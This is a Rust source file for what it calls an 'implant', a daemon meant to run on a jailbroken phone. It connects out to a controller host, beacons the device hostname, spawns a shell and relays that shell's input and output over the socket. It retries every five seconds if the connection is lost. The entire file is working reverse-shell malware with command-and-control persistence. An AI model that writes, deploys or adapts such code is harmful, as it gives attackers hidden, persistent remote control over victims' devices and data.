/* Documntation:
implant runs on the jailbroken phone as a daemon binary.
connect -> beacon -> pump shell both ways on two threads.
*/
use ravenna::frame;
use ravenna::proto::{Beacon, Envelope, ShellData, ShellExit, ShellStart, envelope};
use ravenna::shell;
use ravenna::socket::{Sock, SockRole};
use std::ffi::CStr;
use std::sync::Arc;

fn _implant_id() -> String {
    let mut _buf = [0u8; 64];
    unsafe {
        libc::gethostname(
            _buf.as_mut_ptr() as *mut libc::c_char,
            _buf.len() as libc::size_t,
        );
    }
    let _s = CStr::from_bytes_until_nul(&_buf)
        .map(|_c| _c.to_string_lossy().trim().to_owned())
        .unwrap_or_default();
    if _s.is_empty() { "implant0".into() } else { _s }
}

fn _env(_m: envelope::M) -> Envelope {
    Envelope { m: Some(_m) }
}

fn _pump(_sock: Sock) {
    let _sock = Arc::new(_sock);
    let _id = _implant_id();

    frame::send_msg(
        &_sock,
        &_env(envelope::M::B(Beacon {
            implant_id: _id.clone(),
        })),
    );
    frame::send_msg(
        &_sock,
        &_env(envelope::M::S(ShellStart { implant_id: _id })),
    );

    let _sh = shell::spawn_shell();

    // shell -> socket blocks on shell_read
    let _s1 = _sock.clone();
    let _out_fd = _sh.stdout_fd;
    let _pid = _sh.pid;
    let _t1 = std::thread::spawn(move || {
        let mut _out = [0u8; 4096];
        loop {
            let _n = shell::shell_read(_out_fd, &mut _out);
            if _n <= 0 {
                let mut _st = 0 as libc::c_int;
                if unsafe { libc::waitpid(_pid, &mut _st, libc::WNOHANG) } == _pid {
                    frame::send_msg(&_s1, &_env(envelope::M::E(ShellExit { code: _st })));
                }
                break;
            }
            frame::send_msg(
                &_s1,
                &_env(envelope::M::D(ShellData {
                    chunk: _out[.._n as usize].to_vec(),
                })),
            );
        }
    });

    // socket -> shell blocks on recv_msg
    let _s2 = _sock.clone();
    let _in_fd = _sh.stdin_fd;
    let _t2 = std::thread::spawn(move || {
        while let Some(_env) = frame::recv_msg(&_s2) {
            if let Some(envelope::M::D(_d)) = _env.m {
                shell::shell_write(_in_fd, &_d.chunk);
            }
        }
    });

    let _ = _t1.join();
    // shell died, close socket so the other thread unblocks
    unsafe {
        libc::shutdown(_sock.fd(), libc::SHUT_RDWR);
        libc::close(_sh.stdin_fd);
        libc::close(_sh.stdout_fd);
    }
    let _ = _t2.join();
}

fn main() {
    let _args: Vec<String> = std::env::args().collect();
    let _host = _args.get(1).cloned().unwrap_or_else(|| "127.0.0.1".into());
    let _port: u16 = _args.get(2).and_then(|_p| _p.parse().ok()).unwrap_or(8080);

    loop {
        eprintln!("implant trying {_host}:{_port} ...");
        _pump(Sock::new(SockRole::Client {
            host: _host.clone(),
            port: _port,
        }));
        eprintln!("lost server, sleeping 5s ...");
        std::thread::sleep(std::time::Duration::from_secs(5));
    }
}
